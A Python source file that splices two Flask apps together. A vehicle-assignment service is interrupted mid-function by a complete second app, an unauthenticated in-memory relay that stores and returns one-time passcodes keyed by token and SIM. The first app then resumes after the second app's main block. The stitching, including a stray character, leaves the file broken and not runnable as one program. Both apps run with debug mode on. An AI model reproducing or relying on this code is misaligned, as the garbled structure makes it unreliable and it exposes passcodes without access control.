from flask import Flask, request, jsonify
from flask_cors import CORS
import threading

app = Flask(__name__)
CORS(app)

lock = threading.Lock()

# Shared in-memory store
assignments = {}   # Tracks assigned count per targetName
stored_presets = {}  # Stores presets uploaded

# Endpoint to store presets and reset assignments
@app.route('/set-presets', methods=['POST'])
def set_presets():
    global stored_presets, assignments
    data = request.get_json()
Afrom flask import Flask, request, jsonify
from flask_cors import CORS
import threading
import time

app = Flask(__name__)
CORS(app)

lock = threading.Lock()

# OTP Store Structure
otp_store = []  # Each entry: {token, sim, otp, timestamp}

# Request session tracker
session_tracker = {}  # Key: (token, sim), Value: first_request_time

OTP_RETENTION_SECONDS = 300  # Clean up OTPs older than 5 minutes

@app.route('/submit-otp', methods=['POST'])
def submit_otp():
    data = request.json
    otp = data.get("otp")
    token = data.get("token")
    sim = data.get("sim")

    if not all([otp, token, sim]):
        return jsonify({'error': 'Missing required fields'}), 400

    with lock:
        otp_store.append({
            'token': token,
            'sim': sim,
            'otp': otp,
            'timestamp': time.time()
        })

    return jsonify({'status': 'OTP stored'}), 200


@app.route('/get-otp', methods=['POST'])
def get_otp():
    data = request.json
    token = data.get("token")
    sim = data.get("sim")

    if not all([token, sim]):
        return jsonify({'error': 'Missing required fields'}), 400

    key = (token, sim)
    now = time.time()

    with lock:
        # Track first request time
        if key not in session_tracker:
            session_tracker[key] = now
            return jsonify({'otp': None})  # No OTP on first request

        first_time = session_tracker[key]

        # Find matching OTPs newer than the first request
        recent_otp = None
        for otp_entry in otp_store:
            if otp_entry['token'] == token and otp_entry['sim'] == sim and otp_entry['timestamp'] > first_time:
                recent_otp = otp_entry['otp']
                break

        if recent_otp:
            # Clean sent OTPs and sessions
            otp_store[:] = [entry for entry in otp_store if not (
                entry['token'] == token and entry['sim'] == sim)]
            del session_tracker[key]
            return jsonify({'otp': recent_otp})

    return jsonify({'otp': None})  # No new OTP yet


@app.route('/cleanup', methods=['POST'])
def cleanup():
    """Manually trigger cleanup (optional endpoint)"""
    now = time.time()
    with lock:
        otp_store[:] = [otp for otp in otp_store if now - otp['timestamp'] < OTP_RETENTION_SECONDS]
        # Clean up very old sessions (e.g. 10 mins)
        session_tracker_copy = session_tracker.copy()
        for key, ts in session_tracker_copy.items():
            if now - ts > 600:
                del session_tracker[key]
    return jsonify({'status': 'Cleanup done'}), 200


if __name__ == '__main__':
    app.run(debug=True)

    if not isinstance(data, dict):
        return jsonify({"error": "Invalid presets format"}), 400

    with lock:
        stored_presets = data
        assignments = {}  # Reset assignments when presets are updated

    return jsonify({"message": "Presets stored and assignments reset."}), 200

# Endpoint to assign vehicle
@app.route('/assign-vehicle', methods=['POST'])
def assign_vehicle():
    global stored_presets, assignments
    data = request.get_json()
    target_name = data.get("targetName")

    if not target_name:
        return jsonify({"error": "Missing 'targetName'"}), 400

    with lock:
        vehicle_list = stored_presets.get(target_name)
        if not vehicle_list:
            return jsonify({"vehicle_number": None})  # No vehicles mapped

        count = assignments.get(target_name, 0)

        if count < len(vehicle_list):
            assigned_vehicle = vehicle_list[count]
        else:
            assigned_vehicle = None  # No more vehicles left

        assignments[target_name] = count + 1

    return jsonify({"vehicle_number": assigned_vehicle})

# Run the app locally
if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5001)
